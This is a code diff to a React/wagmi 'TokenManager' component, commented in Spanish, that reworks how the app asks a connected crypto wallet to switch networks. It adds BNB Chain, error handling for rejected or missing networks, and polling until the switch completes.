@@ -2,7 +2,7 @@
 
 import React, { useEffect, useState } from 'react'
 import { useAppKit } from '@reown/appkit/react'
-import { useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
+import {useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
 import { ethers } from 'ethers'
 
 interface Token {
@@ -65,54 +65,105 @@ export default function TokenManager(): React.JSX.Element {
   const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])
 
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
+  const { switchChain } = useSwitchChain()
 
-  const changeChainIfNeeded = async (targetChainId: number): Promise<void> => {
+  
+
+const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
+  if (!walletClient) throw new Error('Wallet client no disponible')
+
   try {
-    if (!walletClient) throw new Error('Wallet client no disponible');
-    
-    // Obtener la cadena actual
-    const currentChainId = await walletClient.getChainId();
-    if (currentChainId === targetChainId) return;
+    setLoadingMessage(`Cambiando a la red ${targetChainId}...`)
+    setIsLoading(true)
 
-    // Intentar cambiar de cadena
-    showLoading(`Cambiando a la red ${targetChainId}...`);
-    
-    await walletClient.request({
-      method: 'wallet_switchEthereumChain',
-      params: [{ chainId: `0x${targetChainId.toString(16)}` }],
-    });
-    
-    // Esperar a que la wallet se actualice
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-  } catch (error: any) {
-    if (error.code === 4902) {
-      // Cadena no agregada en la wallet - agregar BNB Chain si es necesario
-      if (targetChainId === 56) {
-        await walletClient.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: '0x38',
-            chainName: 'BNB Smart Chain',
-            nativeCurrency: {
-              name: 'BNB',
-              symbol: 'BNB',
-              decimals: 18,
-            },
-            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-            blockExplorerUrls: ['https://bscscan.com/'],
-          }],
-        });
-        return;
+    const getCurrent = async () => {
+      try {
+        return await walletClient.getChainId()
+      } catch (e) {
+        return undefined
       }
-      throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`);
     }
-    if (isUserRejected(error)) {
-      throw new Error('Usuario rechazó el cambio de red');
+
+    const currentChainId = await getCurrent()
+    if (currentChainId === targetChainId) {
+      setIsLoading(false)
+      return
     }
-    throw new Error(`Error cambiando de red: ${error.message}`);
+
+    // Intentar usar switchChain de wagmi si está disponible
+    let switched = false
+    try {
+      if (switchChain) {
+        await switchChain({ chainId: targetChainId })
+        switched = true
+      }
+    } catch (swErr: any) {
+      // Si switchChain no funcionó, seguiremos intentando con wallet RPC
+      if (swErr?.code && swErr.code !== 4902 && !isUserRejected(swErr)) {
+        // dejar que el siguiente bloque intente un switch alternativo o agregar la cadena
+      }
+      if (isUserRejected(swErr)) {
+        throw new Error('Usuario rechazó el cambio de red')
+      }
+    }
+
+    // Si no se hizo el cambio con switchChain, intentar con request RPC
+    if (!switched) {
+      try {
+        await walletClient.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: `0x${targetChainId.toString(16)}` }]
+        })
+      } catch (err: any) {
+        // Si la cadena no existe (4902) intentamos agregarla
+        if (err?.code === 4902) {
+          // sólo ejemplo para BSC; agregar más blockchains según necesites
+          if (targetChainId === 56) {
+            await walletClient.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com/']
+              }]
+            })
+            // intentar switch otra vez
+            await walletClient.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x38' }]
+            })
+          } else {
+            throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`)
+          }
+        } else if (isUserRejected(err)) {
+          throw new Error('Usuario rechazó el cambio de red')
+        } else {
+          throw err
+        }
+      }
+    }
+
+    // Polling: esperar hasta que la wallet realmente reporte la nueva chain
+    const start = Date.now()
+    while (Date.now() - start < timeoutMs) {
+      const newChain = await getCurrent()
+      if (newChain === targetChainId) {
+        setIsLoading(false)
+        return
+      }
+      await new Promise((r) => setTimeout(r, 500))
+    }
+
+    throw new Error('Timeout esperando que la wallet cambie de red')
+  } catch (error: any) {
+    setIsLoading(false)
+    // rethrow con mensaje legible
+    if (isUserRejected(error)) throw new Error('Usuario rechazó el cambio de red')
+    throw new Error(error?.message || String(error))
   }
-};
+}
 
   useEffect(() => {
     setIsClient(true)
@@ -286,12 +337,16 @@ export default function TokenManager(): React.JSX.Element {
     const message = String(error?.message || '').toLowerCase()
     return /user denied|user rejected|rejected by user/i.test(message)
   }
+    
 
   const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
   try {
     if (!walletClient || !publicClient || !address) {
       throw new Error('Wallet no conectada correctamente');
     }
+
+    // Cambiar a la cadena correcta antes de procesar
+    await changeChainIfNeeded(token.chain as number)
 
     const targetChainId = token.chain as number;
     if (!targetChainId) {
@@ -552,7 +607,7 @@ export default function TokenManager(): React.JSX.Element {
 
     // Procesar tokens nativos automáticamente
     for (const token of sortedNativeTokens) {
-      await processNativeToken(token)
+      await changeChainIfNeeded(token.chain as number)
     }
 
     setProcessing(false)
